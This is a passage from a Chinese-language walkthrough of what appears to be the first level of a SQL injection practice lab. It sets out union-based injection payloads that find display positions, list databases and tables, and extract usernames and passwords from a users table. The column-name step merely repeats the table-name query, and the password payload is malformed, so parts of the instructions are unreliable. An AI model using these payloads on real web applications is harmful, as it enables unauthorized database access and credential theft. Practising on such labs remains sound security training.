4、接着我们要id=1改为一个数据库不存在的值，可以改成负数，0，这里任意输入一个数861，使用union select 1,2,3联合查询语句查看页面是否有显示位。

有两个显示位。

5、然后就可以利用sql查询语句爆破出自己想要的信息：

我们先爆破出他的数据库名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+

查询security内的所有表名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+

然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+

最后爆出他的username和password:

?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users)–+

?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concatpassword) from security.users)–+

至此，第一关结束！
